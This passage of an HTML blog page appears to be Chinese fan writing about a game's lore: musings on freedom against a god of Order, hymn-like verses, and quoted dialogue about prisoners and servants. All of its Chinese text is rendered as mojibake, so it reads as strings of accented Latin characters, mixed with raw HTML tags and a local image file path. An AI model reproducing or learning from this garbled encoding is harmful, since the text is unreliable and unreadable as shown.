èº«ï¼Œä¾¿æ‹¿èµ°ä»–çš„çƒ¦æ¼æ—©æœ‰äººæ²‰è¿·æ¸¸æˆï¼Œä¾¿æ‹¿èµ°ä»–çš„å¿«ä¹ã€‚æ²¡æœ‰äººèƒ½äº’ç›¸ä¼¤å®³ï¼Œæ²¡æœ‰äººä¼šç»å†ç¦»åˆ«ã€‚</p><p>æ²¡æœ‰è´¨ç–‘ï¼Œæ²¡æœ‰æ€è€ƒï¼Œæ²¡æœ‰è‡ªç”±ï¼Œè¿™é‡Œæ²¡æœ‰èƒŒå›ï¼Œå› ä¸ºæ‰€æœ‰äººéƒ½å¿ è¯šäºå”¯ä¸€ï¼Œè¿™é‡Œæ²¡æœ‰è¿‡å»ä¹Ÿæ²¡æœ‰æœªæ¥ï¼Œåªæœ‰æ°¸è¿œå¹¸ç¦å¿«ä¹çš„ç°åœ¨ï¼Œåœç•™åœ¨å½“ä¸‹çš„å¿«ä¹ï¼Œä»£ä»·å³ä¸ºæœªæ¥çš„æ™¯è‰²</p><p>å“ªæ€•ä½ æ˜¯ä¸ºä»–å¥½ï¼Œè¿™æ¢¦ä¹ŸçœŸçš„æ¯”ç°å®æ›´å¥½ä¹Ÿæ˜¯ä¸€æ ·ï¼Œé‚£ç§å†²åŠ¨æ— å…³ç†æ™ºï¼Œç”šè‡³ä¹Ÿæ— å…³åˆ©ç›Šï¼Œé‚£å°±æ˜¯â€œæˆ‘æ„¿æ„â€æ˜¯çš„ä½ æ˜¯å¯¹æˆ‘å¥½ï¼Œä½†æˆ‘å°±æ˜¯ä¸ä¹æ„</p><p>æˆ‘ä¸æ„¿è¢«ä»»ä½•äººæ”¯é…ï¼Œé‚£äº›â€œç¥â€â€œä¸»â€â€œå¤©â€å•Šï¼Œä½ å¹¶ä¸ç›¸ä¿¡äººç±»ï¼Œå´éœ€è¦æ‰€æœ‰çš„äººç±»ç›¸ä¿¡ä»–ï¼Œä½ ä»¥ã€Œç§©åºã€ä¸ºå¤©åœ°ä¸‡ç‰©ä¸‡æ°‘å®šä¹‰â€”â€”å´ä»¤æˆ‘ç­‰æ™“å¾—è‡ªå·±ä¸è¿‡æ˜¯ä½ çš„å‚€å„¡ï¼è¡¨é¢ä¸Šæ˜¯åœ¨è¿½æ±‚æ‰€è°“çš„æ°¸æ’æ­£ç¡®ï¼Œå®è´¨æ˜¯å¦„å›¾ç”¨ä¸€ç§ç­”æ¡ˆä¸€äº†ç™¾äº†çš„è§£å†³ä¸€åˆ‡ï¼Œä½œä¸ºäººç±»çš„æˆ‘ç›¸ä¿¡æ‰€æœ‰äººï¼Œäºæ˜¯é‚£äº›è¢«ç›¸ä¿¡çš„äººå°±å¯ä»¥é€‰æ‹©å»ç›¸ä¿¡</p><p>æ·å¾„ï¼Œæ°¸è¿œæ˜¯æœ‰ä»£ä»·çš„ï¼Œè¦å®ç°é‚£è®©æ‰€æœ‰äººå¹¸ç¦çš„å®ä¼Ÿç›®æ ‡ï¼Œåªèƒ½æ˜¯ä¸€æ­¥ä¸€æ­¥ï¼Œåœ¨æ‰€æœ‰å‰äººçš„å¸®åŠ©ä¸‹è¸è¸å®å®èµ°å‘æœªæ¥ï¼Œç„¶åä¸€æ‹³ä¸€æ‹³ï¼Œå°†æ‰€æœ‰æ‹¦åœ¨é¢å‰çš„å›°éš¾å ‚å ‚æ­£æ­£çš„æ‰“è¶´ä¸‹ï¼Œå‘¨å¤©ä¸‡ç‰©ï¼Œå”¯æ˜“ä¸æ˜“ï¼Œæ‰€ä»¥è¦æ°¸è¿œå‰è¿›ï¼Œæ°¸è¿œå¼€æ‹“ï¼Œæ°¸è¿œé©æ•…é¼æ–°ï¼Œæ€»å¾—æœ‰äººä»æ¢¦ä¸­é†’æ¥ï¼Œå»æ”¹å˜è¿™ä¸ªè®©äººæƒ³è¦å»åšæ¢¦çš„ä¸–ç•Œï¼Œä½†äººå°±æ˜¯å¦‚æ­¤ç‹‚å¦„æ„šæ˜§ä¸çŸ¥å¥½æ­¹ä¸å¯ç†å–»çš„ç”Ÿç‰©ï¼Œä»–ä»¬å¿ƒä¸­çš„åŸåˆä¹‹ç«æ ¹æœ¬æ— æ³•ç†„ç­ï¼Œé‚£æ˜¯ä»æ ‘ä¸Šèµ°å‘å¹¿é˜”çš„å¤§åœ°æ—¶å°±å……ç›ˆèƒ¸è†›çš„æœ¬èƒ½ï¼Œäºæ˜¯ä»–ä»¬ä¸€å®šè¦åœ¨å¤©å ‚ä¸­æ¸´æœ›æœªçŸ¥ä¸æ„ä¹‰ï¼Œäºæ˜¯ä»–ä»¬å°†ä½“ä¼šå¤±å»ä¸æ­»äº¡ï¼Œä½“ä¼šä¸€åˆ‡å¯æ€–ä¹‹ç‰©ï¼Œæ•…è€Œç†è§£ä½•è°“åæ‚”ï¼Œé”™è¯¯ï¼Œä½•è°“çœŸæ­£çš„çˆ±ä¸ç›¸ä¿¡ï¼Œä»–ä»¬æƒ³è¦ä½œä¸ºä¸€ä¸ªâ€œæ„šè€…â€ï¼Œå»é€‰æ‹©çœ‹ä¸Šå»â€œé”™è¯¯â€çš„é“è·¯ï¼Œä»…ä»…æ˜¯ä¸ºäº†è·å¾—èƒ½å¤Ÿâ€œè¯•è¯•â€ï¼Œèƒ½å¤Ÿå»é€‰æ‹©çŠ¯é”™çš„æƒåˆ©ï¼Œäººæ˜¯ä½åŠ£åˆå‘å¾€å´‡é«˜ï¼Œæ»¡æ˜¯ç¼ºé™·åˆæœŸå¾…å®Œç¾çš„ç”Ÿç‰©ï¼Œæ‰€ä»¥äººåšä¿¡èƒ½ç”¨è‡ªå·±çš„æ™ºæ…§èµ°å‡ºè‡ªå·±çš„é“è·¯ã€‚ä¸æ„¿å±…ä½åœ¨ç¥èµçš„æ°¸æ’å¹¸ç¦ä¹‹ä¼Šç”¸ï¼Œæ‰€ä»¥äººç»ˆç©¶ä¼šé€‰æ‹©å‰å¾€åä¸ºè‡ªç”±çš„åœ°ç‹±ï¼Œç„¶ååœ¨åœ°ç‹±ä¸­æ¸´æœ›å¤©å ‚çš„å…‰æ˜ï¼Œè€Œæ­£æ˜¯è¿™è‡ªç”±å¸¦æ¥çš„æ— é™å¯èƒ½ä¹‹æœªæ¥ï¼Œæ–¹ä»¤æ‰€æœ‰å¿ƒæ™ºä¸è‡³äºé™·å…¥æ— æ„ä¹‰çš„ç»æœ›ï¼Œäº‹ç‰©çš„å¥½åæ°¸è¿œéƒ½æ˜¯ä¸€ä½“ä¸¤é¢ï¼Œå¼ºè€…å¯ä»¥å¼€æ‹“è¿œæ–¹ï¼Œå®ˆæœ›å¼±è€…ï¼ŒæŒ‡å¼•æ–¹å‘ï¼Œçº æ­£å®è§‚çš„é”™è¯¯ï¼Œå¼±è€…è¢«å…è®¸è½åï¼Œå…è®¸åŸåœ°ä¼‘æ¯ï¼Œä½†ä¹Ÿä¸ä¼šè¢«æŠ›å¼ƒâ€”â€”è‹¦éš¾ä¸é˜³å…‰</p><img src="F:\new myblog\STUDY\source\img\560px-ç§©åºæ˜Ÿç¥_å¤ªä¸€.webp" style="zoom: 67%;" /><p>ã€Œè‡ªé»„æ˜æˆ˜äº‰ä»¥é™å¤©ç©¹ç©ºè™šï¼Œå¤§åœ°æ··æ²Œã€‚ä¸ºæ•™å¤©åœ°ä¸‡ç‰©å½’äºå¯çŸ¥ï¼Œã€ç§©åºã€å¤ªä¸€é™ç”Ÿã€‚è¿™ä¾¿æ˜¯å¤´ä¸€æ—¥ã€‚ã€<br>ã€Œç¥‚é‡‡æ˜Ÿäº‘ä½œæˆç¾½æ‹”ï¼Œé€ äº†æœ‰é»‘ç™½é”®çš„å¤§ç´ã€‚å‡»æ‰“ç™½é”®ï¼Œå¤ªé˜³å‡èµ·ï¼Œå‡»æ‰“é»‘é”®ï¼Œæœˆäº®å‡èµ·ã€‚æ˜¼å¤œå°±è¿™æ ·æˆäº†ã€‚è¿™ä¾¿æ˜¯ç¬¬äºŒæ—¥ã€‚ã€<br>ã€Œç¥‚æ’·æ˜Ÿæµåˆ¶æˆç¬”å°–ï¼Œæ‹Ÿäº†å‘éŸ³å’Œè®¡æ•°çš„ç¬¦å·ã€‚ç¥‚ä½¿æ˜Ÿå°˜æ±‡æˆæ²³æµï¼ŒæŒ‡è®¤é‚£å–„ä¸ä¹‰çš„åœ¨ä¸Šæ¸¸ï¼Œé‚£æ¶ä¸ä¸ä¹‰çš„åœ¨ä¸‹æ¸¸ã€‚ä¸‡ç‰©è‡ªæ­¤è’™å—å„è‡ªçš„è®°å·ï¼Œä¸–äººè‡ªæ­¤å¾—ä»¥çŸ¥æ™“å–„æ¶ä¸åˆ©å®³ã€‚è¿™ä¾¿æ˜¯ç¬¬ä¸‰æ—¥ä¸ç¬¬å››æ—¥ã€<br>ã€Œç¥‚æ‹¾æ˜Ÿç¯é™ˆæ˜æ³•åº¦ï¼ŒåŒäººç¾¤ç«‹äº†è¡Œäº‹çš„å…¸ç« ã€‚ä»¥æœ‰é»‘ç™½é”®çš„å¤§ç´ä¸ºä¹å™¨ï¼›ä»¥å‘éŸ³å’Œè®¡æ•°çš„ç¬¦å·ä¸ºéŸ³ç¬¦ï¼›ä»¥æœ‰ä¸‹è¡Œæ— ä¸Šè¡Œçš„æ²³æµä½œæ—‹å¾‹ï¼›ä»¥é™ˆæ˜æ³•åº¦çš„å…¸ç« å®šæ›²å¼ã€‚ä¸–äººé‚åœ¨ä¹ç« ä¸­æ‰¾å‡†å”¯ä¸€çš„ä½ç½®ï¼Œè¿™ä¾¿æ˜¯ç¬¬äº”æ—¥ä¸ç¬¬å…­æ—¥ã€‚ã€<br>ã€Œç¥‚èµäº†ä¸–é—´ä¼—äººã€æ„ä¹‰ã€ï¼Œå¤©åœ°ä¸‡ç‰©éƒ½é€ é½äº†ã€‚ç¥‚æ­‡äº†ä¸€åˆ‡åˆ›é€ çš„å·¥ã€‚ç„¶è€Œï¼Œä¼—ç”Ÿå¤å‘å¤ªä¸€å‘¼å‘Šï¼šã€ä½ ä»¥ã€Œç§©åºã€ä¸ºä¸‡æ°‘å®šä¹‰ï¼Œå´ä»¤æˆ‘ç­‰æ™“å¾—è‡ªå·±ä¸è¿‡æ˜¯ä½ çš„å‚€å„¡ï¼æ•…åœ¨é‚£æ—¥ï¼Œä¸‡ä¼—é›†ç»“ä¸€å¿ƒï¼Œå°†ç¥æŠ•å…¥æ¯ç­å‘ä¸­ã€‚è¿™ä¾¿æ˜¯ç¬¬ä¸ƒæ—¥ã€‚ã€<br>ã€Œæ¬¢å‘¼é¢‚å”±é‚æµå£°å“èµ·â€”ä¸€ã€</p><p>æ™®ä¸–åŒè°ï¼Œç¾¤æ˜Ÿå…±ç† ï¼Œæ— ä¸ŠåŠŸå¾·é¢‚ç¥ä¸»â€”-ç§©åºå·²æ­»ï¼ç§©åºå·²æ­»ï¼ç§©åºå·²æ­»ï¼<br>ä¼¤å“‰ï¼æœ‰å¤§ä¼ŸåŠ›çš„æ˜Ÿç¥ï¼Œä½ ä»¥ã€Œè½¶åºã€ä¸ºå¤©åœ°ä¸‡ç‰©ä¸‡æ°‘å®šä¹‰â€”â€”å´ä»¤æˆ‘ç­‰æ™“å¾—è‡ªå·±ä¸è¿‡æ˜¯ä½ çš„å‚€å„¡ï¼<br>èª“ä»¥å£«ä¸‡ä¸ƒåƒä¸‰ç™¾ä¸‰åå…­æšéŸ³ç¬¦ï¼Œé€šå‘Šå°”ç­‰ï¼ŒåŠ å…¥å…‰èœçš„åˆå”±â€”å½’äºå¤©å ‚ï¼<br>å¦‚æœæ¢¦å¢ƒä¸ç°å®æ— å¼‚ï¼Œå®ƒè¿˜èƒ½è¢«ç§°ä½œè™šå‡ä¹ˆï¼Ÿ<br>æˆ‘ä»¥å®Œç¾æ— ç¼ºçš„ä¹ç« å·å¿µï¼Œä¸€å†åˆ›ä¹å›­<br>å·²æ­»çš„æ˜Ÿç¥ï¼Œæˆ‘å‘ä½ è‡´æ•¬ã€‚<br>ä»¥æ­¤ä¸ƒæ—¥èª“è¨€ï¼Œå‘½å°”å¬ä»å·ä»¤<br>å¹¶éæ˜¯ä½ é€ åŒ–ä¸‡ç‰©ï¼Œè€Œæ˜¯äººå†é€ äº†ä½ ï¼Œä»¥å°”ç¥èº¯ï¼Œä¸ºæˆ‘ç­‰ä¹å›­å¥ åŸºï¼<br>ç”Ÿå‘½å› ä½•è€Œæ²‰ç¡ï¼Ÿå› ä¸º..æ€»æœ‰ä¸€å¤©â€¦..æˆ‘ä»¬ä¼šä»æ¢¦ä¸­é†’æ¥ã€‚</p><p>ã€Šå›šäººé¢‚ã€‹<br> æ¶å›¾å¾’è’™å¬å—åˆ¤â€”-ç¾¤é­”æ…‘æœï¼Œæ¶Œå…¥çŒ›ç«ï¼Œå©é¦–å“€æ±‚ï¼Œå…‹æ—¥å‚é¡¾ï¼<br>â€œå¸Œæœ›ä½ èƒ½å–œæ¬¢è¿™ç‰‡ç„¦åœŸä¹‹ä¸Šçš„â€¦[ç¾æ¢¦ä¹‹åœ°]ã€‚è¯·ç»§ç»­å‘å‰èµ°å§ï¼Œæ—…è€…ã€‚åœ¨æ—…é€”çš„å°½å¤´ï¼Œæˆ‘æœ‰äº‹æƒ³è¯·æ±‚ä½ ä»¬çš„ååŠ©ã€‚â€<br>ã€Œç¥ç€å†2147çºªï¼Œå›šçŠ¯å“ˆåŠªåŠªæ€èµ·äº†å£°åŠ¿æµ©å¤§çš„æˆ˜ç«ï¼Œå¹¶è·å¾—èƒœåˆ©ã€‚å…¬å¸ç§°å…¶ä¸ºã€è¾¹é™²æˆ˜äº‰ã€ï¼Œè€Œé˜¿æ–¯å¾·çº³äººç§°å…¶ä¸ºã€ç‹¬ç«‹æˆ˜äº‰ã€]<br>â€œå›šç¬¼è¢«ç²‰ç¢äº†ï¼Œç‹±å’è¢«é©±é€äº†ï¼â€<br>ã€Œå“ˆåŠªåŠªå…ˆç”Ÿæ˜¯ä¸€ä½ä¼Ÿäººã€‚ä½†æˆ‘ä»¬ä¸åº”è®³è¨€ï¼Œä»–èƒ½å¤Ÿå¸¦ç»™å›šå¾’è‡ªç”±ï¼Œå´ä¸çŸ¥æ™“å¦‚ä½•ç»™äºˆä»–ä»¬çœŸæ­£çš„è‡ªç”±ã€‚ã€<br>â€œå¯æ•¬çš„æ—…äººï¼Œæ„Ÿè°¢ä½ ä»¬ç•™ä¸‹ï¼Œå¯ä½ ä¹Ÿæ— æ³•é©±é€é‚£äº›ç‹±å’ï¼Œå³ä¾¿ä»–ä»¬æ—©å·²ä¸åœ¨é˜¿æ–¯å¾·çº³â€<br>ã€Œä¸‰ä½æ— åå®¢ç•™åœ¨æ­¤åœ°ï¼Œè¯•å›¾å‘è¾¹ç¡ç›‘ç‹±ä¼ é€’ã€å¼€æ‹“ã€çš„æ•™ç›Šï¼Œä½†å¯æƒ…ï¼Œæ— æµäºäº‹ã€‚ã€<br>â€œæˆ‘ä»¬åº”å½“å†é€ ä¸€ä¸ªå›šç¬¼ï¼Œä¸åœ¨è¿™ä¸–ä¸Šï¼Œè€Œåœ¨äººå¿ƒä¸­ï¼Œåªè¦æˆ‘ä»¬ä¸ä½¿ä»–ä»¬è‡ªç”±ï¼Œä¾¿æ°¸è¿œä¸ä¼šæµç¦»å¤±æ‰€â€<br>ã€Œé˜¿æ–¯å¾·çº³å†åº¦è¢«æˆ˜ç«å¸­å·ï¼Œè¿™æ¬¡çš„æ•Œäººæ¥è‡ªå†…éƒ¨ã€‚å›šå¾’è‡³æ­»ä»æ˜¯å›šå¾’ï¼ŒåªçŸ¥ä¸ºè‡ªç”±è€Œæˆ˜ï¼Œä¸çŸ¥ä¸ºè‡ªç”±è€Œç”Ÿã€‚ã€<br>ã€Œå¸Œæœ›ä½ å–œæ¬¢è¿™ç‰‡ç„¦åœŸä¹‹ä¸Šçš„â€”ä¸€è‡ªç”±ä¹‹åœ°ã€‚ã€<br>çœ‹å§ï¼Œä»–ä»¬çš„åˆ‘æœŸæ—©å·²ç»“æŸï¼Œå…¬å¸çš„ç‹±å’ä¹Ÿå·²è¢«é©±é€ã€‚å¯è¿™äº›å›šçŠ¯ä»æ˜¯å¥´éš¶ä¹‹èº«ï¼Œå› ä¸ºå›šç¦ä»–ä»¬çš„ä¸æ˜¯å¤–ç‰©ï¼Œè€Œæ˜¯å†…å¿ƒã€‚<br>è‡ªç”±å­˜åœ¨äºä»»ä½•åœ°æ–¹ï¼Œå”¯ç‹¬ä¸å­˜åœ¨äºè½¯å¼±çš„çµé­‚ã€‚å®ƒè¥„åŠ©ä¸äº†ä»»ä½•äººï¼Œåªèƒ½è¥„åŠ©ä¿¡å®ƒå­˜åœ¨çš„äººã€‚<br>ã€Œå›šå¾’ä»¬å•Šï¼æˆ‘å‘½ä»¤ä½ ä»¬å­¦ä¼šè‡ªç”±ï¼Œå¹¶æ•™ä¼šä½ ä»¬çš„å…„å¼Ÿâ€”ä¸€ä¸ºç”Ÿè€Œæˆ˜ï¼ã€<br>ã€Œå·²ç»ä¸å†æœ‰äººèƒ½é˜»æ–­ä½ ä»¬çš„é“è·¯ï¼Œä½ ä»¬è‡ªç”±äº†ã€‚ã€è‡³æ­¤ä¾¿æ˜¯ç¬¬ä¸€å¹•ã€‚ç››ç‡ƒçš„æˆ˜ç«ä¸­ï¼Œã€è¾¹é™²ç›‘ç‹±ã€é€æ¸èµ°å‘ã€æµæ”¾ä¹‹åœ°ã€</p><p>ã€Šæ„šä»†é¢‚ã€‹<br>ä¹‰äººå¦‚ç¾Šèµ°è¿·â€”â€”â€”â€”ä¹‰äººä¸ç¨³ï¼Œè¿·è¯¯æ­§é€”ï¼Œæœ›å°”ä½¿äºˆï¼Œå½’å¤ç‰§ç¾¤ï¼<br>ã€Œæµæ”¾ä¹‹åœ°çš„ç§©åºååˆ†æ··ä¹±ï¼Œåˆæœ‰å†…å¿§å¤–æ‚£è™è§†çœˆçœˆã€‚ä¸ƒå¤§å®¶ç³»è¡¨é¢ç»Ÿä¸€ï¼Œå®åˆ™å„è‡ªä¸ºæ”¿ï¼Œçº·äº‰ä¸æ–­ã€‚ã€<br>â€œä¸ƒä½ä»†äººéƒ½è®¤ä¸ºè‡ªå·±èƒ½å–ä»£æ—§æ—¥çš„ä¸»äººâ€<br>ã€Œæœ€å…ˆé€€å‡ºå†…æˆ˜çš„æ˜¯é»‘å¸ƒæ—å®¶ç³»ï¼Œåœ¨è‹œè“¿è‰å®¶ç³»ç­–åˆ’çš„ã€ç™½è‰²æ²™æ¼ ã€äº‹ä»¶ä¸­ï¼Œä»–ä»¬æ°¸è¿œæˆä¸ºäº†å†å²ã€‚ã€<br>â€œä¼šè®¡ï¼Œä½ æˆ‘æ˜¯å®…é‚¸çš„åŸºæŸ±ï¼Œæ›¾ç»ç›Ÿèª“å›¢ç»“ä¸€è‡´æ°¸ä¸èƒŒå¼ƒï¼Œä½ â€¦.ä½ ä¸ºä½•è¦æ€æˆ‘â€<br>â€œå› ä¸ºä¸»äººç”¨æ³¥åœŸé€ åŒ–äº†ä½ ï¼Œç”¨çƒˆç«é€ åŒ–äº†æˆ‘ï¼Œæˆ‘æ¯”ä½ æ›´é«˜è´µï¼â€<br>ã€Œè‹œè“¿è‰çš„å®¶ä¸»æ„å›¾æŠ•é å…¬å¸ï¼Œç”¨è‡ªç”±æ¢å–ç”Ÿå­˜ï¼Œå´è¢«é•¿å­å¤§ä¹‰ç­äº²ï¼Œè€Œåè€…æ¥ä»»äº†å®¶ä¸»ä¹‹å¸­ã€‚ã€<br>â€œå­©å­ï¼Œä½ ä¸æ›¾ä¸ºæ—§ä¸»æ•ˆå‘½è€Œä¸æ¸…æ¥šä»–çš„å¨èƒ½ï¼Œä»–èƒ½å¤ºèµ°æˆ‘ä»¬è‡ªç”±ï¼Œä¾¿ä¹Ÿèƒ½èµäºˆæˆ‘ä»¬è‡ªç”±â€<br>ã€Œé“¶æ²³æ®‹é…·è€Œæ— æƒ…ï¼Œç¯è›¾å®¶ç³»è¯•å›¾å¼€å¦åˆ—è½¦ç•™ä¸‹çš„é“¶è½¨ï¼Œå´é­é‡è™«ç¾¤ä½™å­½ï¼Œæƒ¨é­è¦†ç­ã€‚ã€<br>â€œä¸èœ‚å…±èˆè€…ï¼Œå¿…é­èœ‚æ¯’å®³ï¼Œæˆ‘æ—©å·²çŸ¥æ™“æˆ‘çš„å‘½è¿ï¼Œè¿™ä¸€å¤©æ—©æ™šä¼šåˆ°æ¥â€<br>ã€Œç›´åˆ°æ­Œæ–æœ¨å¸¦é¢†å®¶æ—æ¥åˆ°æµæ”¾ä¹‹åœ°ï¼Œäº”å¤§å®¶ç³»å…ˆåçšˆä¾ï¼ŒåŒ¹è¯ºåº·å°¼æ‰å¾—ä»¥æ‹¥æŠ±å®ƒçš„æ–°åâ€”æ¢¦æƒ³ä¹‹åœ°ã€‚ã€<br>â€œè€Œæˆ‘å°†æˆä¸ºè¯¸ä½æ–°çš„å®¶äººï¼Œå¹¶å°†ä½ ä»¬ä»æ­»å»çš„å¹»å½±ä¸­è§£æ”¾â€<br>ã€Œå¤–æ¥çš„å®¾å®¢ï¼Œæˆ‘è¯·æ±‚ä½ å¸®åŠ©è¿™é—´å®…å­ï¼Œæ‘†è„«æ½œè—çš„æ•™å”†è€…çš„æ¯’å®³ã€‚æˆ‘å¸Œæœ›ä»–ä»¬éƒ½èƒ½æ¢å¤ç†æ™ºçš„é•‡é™ï¼Œä¸å†å—åˆ°è™šå¦„çš„æ“æ§ã€<br>â€œè‹¥ä¸»äººä¸å†å½’æ¥ï¼Œæˆ‘ä¾¿æ˜¯è‡ªç”±çš„ã€‚ä½†è‹¥æ²¡æœ‰ä¸»äººçš„æŒ‡å¼•ï¼Œæˆ‘åˆè¯¥ä¸ºè°æ­Œå”±ï¼Ÿâ€â€œæˆ‘åº”ä¸ºæˆ‘çš„æ–°ä¸»æ­Œå”±ï¼Œæ­£å¦‚ç¥‚é«˜è´µçš„å£°éŸ³ï¼Œä¹Ÿæ›¾ä¸ºé“¶æ²³è€Œå“â€<br>â€œä¸»äººï¼æ‚¨ç»ˆå°†å½’æ¥ï¼è€Œæˆ‘å°†æ°¸è¿œå®ˆæœ›ï¼Œç›´åˆ°æ‚¨å› æˆ‘çš„å¿ è¯šè€Œå˜‰å¥–äºæˆ‘â€â€œä¸»äººï¼Œæ‚¨å·²ä¸åœ¨ï¼Œæˆ‘ä¾¿ä¸å†ç­‰å¾…æ‚¨çš„å˜‰å¥–.æ‰€æœ‰ä¸€åˆ‡åº”å±æˆ‘çš„ï¼Œæˆ‘å½“è‡ªå–â€<br>â€œæˆ‘æ›¾æ˜¯æ‰€æœ‰ä»†äººä¸­æœ€å¿ è¯šçš„å«å£«ï¼ä¸»äººé­é©±é€åï¼Œæˆ‘è‡ªå½“ä»£ä»–æ‰§æŒä¸‡æ°‘çš„æƒæŸ„ï¼â€â€œè¿‡å»çš„ä¸»äººæ—©å·²ä¸åœ¨ï¼Œæˆ‘ä¸ºä½•ä»åœ¨ç•æƒ§ä¼—äººæ„é€ çš„æ®‹å½±ï¼Ÿâ€<br>â€œä¸»äººå·²ä¸åœ¨ï¼Œæˆ‘æœ¬å½“è‡ªç”±ï¼Œå¯æ²¡æœ‰ä¸»äººçš„å·ä»¤ï¼Œæˆ‘åªå¾—é—®é“äºç›²â€â€œä¸»äººå·²ä¸åœ¨ï¼Œæˆ‘ä¾¿ä¸å†æœ‰è‡ªå·±çš„ä¸»äººã€‚æˆ‘åº”å¯»æ‰¾æ–°çš„ä¸»äººï¼Œå¹¶ä¸ºä¹‹æ•ˆå¿ ï¼â€<br>â€œæˆ‘è¦ä¹ˆæ˜¯è‡ªå·±çš„ä¸»äººï¼Œè¦ä¹ˆå»è¿å›æ—§ä¸»ï¼Œæ–­ç„¶æ²¡æœ‰æœä»äºæ–°ä¸»çš„é“ç†â€â€œè‹¥æ˜¯æ²¡æœ‰ä¸»äººï¼Œåˆæœ‰è°è¿˜èƒ½èµæˆ‘è‡ªç”±å‘¢ï¼Ÿâ€<br>ã€ŒåŒè°ï¼Œæ”¹å˜äº†åŒ¹è¯ºåº·å°¼ï¼Œä½†åšæ³•éƒ½ä¸è¿‡å»çš„ç‹±å’æ— å¼‚ã€‚ã€<br>ã€Œæ„Ÿè°¢ä½ ä»¬ï¼Œå¤–æ¥çš„å®¾å®¢ï¼ç°åœ¨ä»†äººéƒ½å–å›äº†è‡ªå·±çš„ç†æ€§ã€‚ã€<br>ã€Œä¼—äººå•Šï¼ä½ ä»¬çš„æ—§ä¸»ä¸ä¼šå†å½’æ¥ï¼Œå”¯æœ‰å› æ­£é“è€Œäº’åŠ©ï¼Œä»¥çœŸç†ç›¸å‹‰è€…ï¼Œæ–¹èƒ½åœ¨å½¼æ­¤ä¸­æ”¶è·å®Œæ»¡æˆ˜èƒœè™šä¼ªçš„å¹»å½±â€”ä¸€æ‹¥å…¥å½¼æ­¤çš„æ€€æŠ±å§ï¼ã€<br>å¬ï¼Œæ•´ä¸ªé˜¿æ–¯å¾·çº³éƒ½åœ¨ä¸‹é›ªï¼å¤©ç©ºæ‘‡æ‘‡æ¬²å ï¼Œå¤§åœ°ç§¯é‡éš¾è¿”ã€‚é“¶è‰²å®‡å®™çš„å°½å¤´â€”ä¸€æœé˜³å†’å‡ºäº†åˆç”Ÿçš„èŠ½ï¼å¯æƒœç›´åˆ°æœ€åï¼Œä»–ä»¬ä»æ˜¯ä¸€ç¾¤è¢«èµ‹äºˆäº†è‡ªç”±æƒçš„å¥´éš¶ã€Œè‡³æ­¤ä¾¿æ˜¯ç¬¬äºŒå¹•ã€‚è™›å¹»çš„è°ä¹ä¸­ï¼Œâ€œæµæ”¾ä¹‹åœ°ã€é€æ¸èµ°å‘ã€ç››ä¼šä¹‹æ˜Ÿã€ã€‚ã€</p><p> ã€Šç§©åºé¢‚ã€‹<br> ç”Ÿçµæ°¸æ’å®‰æ¯â€”-ç¥ˆæœ›å¤ªä¸€ï¼Œèµ¦ä¼—å¤™çŠ¯ï¼Œç”Ÿçµå–„æ¶ï¼Œæ¯æ­¢å®‰æ‰€ï¼<br>â€œå¦‚è‹¥æ²¡æœ‰ä¸€ä½å›ç‹ï¼Œåˆæœ‰è°ä¸ºä¸‡æ°‘è´Ÿè´£ï¼Ÿâ€<br> ã€Œè‹¥ä¸‡æ°‘æ²¡æœ‰è¿œè§†çš„åŒçœ¼ï¼Œæˆ‘ä»¬ä¾¿åº”åšå‡ºä»–ä»¬çš„é€‰æ‹©ï¼Œå¹¶ä¸ºä¹‹è´Ÿè´£ã€‚ã€<br>â€œå¦‚è‹¥æ²¡æœ‰ä¸€ä½å›ç‹ï¼Œè°åº‡æŠ¤å­±å¼±è€…ï¼Ÿè°å¯¹æŠ—æ¨ªæš´è€…ï¼Ÿâ€<br>ã€Œæˆ‘ä»¬å¿…å½“ä¸ºåº‡æŠ¤å­±å¼±è€…è€Œäº’åŠ©ï¼Œæ­£å¦‚æˆ‘ä»¬å¿…å½“ä¸ºå¯¹æŠ—æ¨ªæš´è€…è€Œäº’åŠ©ã€‚ã€<br>â€œå¦‚è‹¥æ²¡æœ‰ä¸€ä½å›ç‹ï¼Œè°èƒ½ä½¿æ˜Ÿè¾°æµè½¬ï¼Ÿæ½®æ±æ¶¨è½ï¼Œä¸‡ç‰©ç”Ÿé•¿ï¼Ÿâ€<br>ã€Œåœ¨å›ä¸»å‡ºç°ä¹‹å‰ï¼Œå®ƒä»¬å„è¡Œå…¶æ˜¯ï¼›åœ¨å›ä¸»ç¦»å¼€åï¼Œä»–ä»¬ä¾æ—§å„è¡Œå…¶æ˜¯ã€<br>â€œå¯é€åˆ«å›ç‹åï¼Œè°æ¥åšæ–°çš„å›ç‹å‘¢ï¼Ÿâ€<br>ã€Œæˆ‘ä»¬ä¸å†éœ€è¦ä¸€ä½å›ç‹ã€‚æˆ‘ä»¬æœ¬æ˜¯è¶…ç»ä¸‡ç‰©çš„å›ç‹ã€‚ã€<br>ã€Œæ­é€æ‚¨ç¦»å¼€ï¼Œæ—§æ—¥çš„å›ç‹ã€‚ã€<br>ã€Œæˆ‘ä»æ— é™å»¶ä¼¸çš„èºæ—‹é˜¶æ¢¯ï¼Œå‘ç€æœªæ¥ç¼“ç¼“å è½ã€‚ä¸å¿…æ’ä¹…åœ°è®°ä½æˆ‘ï¼Œæˆ–è¯•å›¾å°†æˆ‘å¯»è·ã€‚æˆ‘å¿ƒä¸­çš„è½®å»“ï¼Œå¿…å°†ä¸å…¶ä»–ç»éªŒäº¤é”™ã€<br>ã€Œæˆ‘ç•™ä¸‹éš¾ä»¥å¯Ÿè§‰çš„ç—•è¿¹ï¼Œåœ¨ä¸€ä¸ªé™å¤œä¸­èµ°è¿‡ã€‚ä¸å¿…æ’ä¹…åœ°è®°ä½æˆ‘ï¼Œæˆ–è¿½å¿µæ¢¦çš„é­‚é­„ã€‚ã€<br>ã€Œå±äºæˆ‘çš„å¿…å°†è¡°è½ï¼Œè€Œä½ ä¼šè¶…è¶Šå®ƒçš„å­±å¼±ã€‚ã€</p><h2 id="é¢„å‘Šä¿¡"><a href="#é¢„å‘Šä¿¡" class="headerlink" title="é¢„å‘Šä¿¡"></a>é¢„å‘Šä¿¡</h2><p>æˆ‘ä»¬æ”¶åˆ°äº†æ¥è‡ªåŒåƒšçš„é‚€çº¦ï¼Œåœ¨é‚€çº¦çš„å°½å¤´æœ‰ç€å‹è¿«ä¸é»‘æš—ï¼Œä»¥åŠä¸€ä½åŒåƒšæ‹¼å°½ç”Ÿå‘½éƒ½æœªå®Œæˆçš„ä¿¡å¿µï¼Œæˆ‘ä»¬å°†ä¹‰æ— 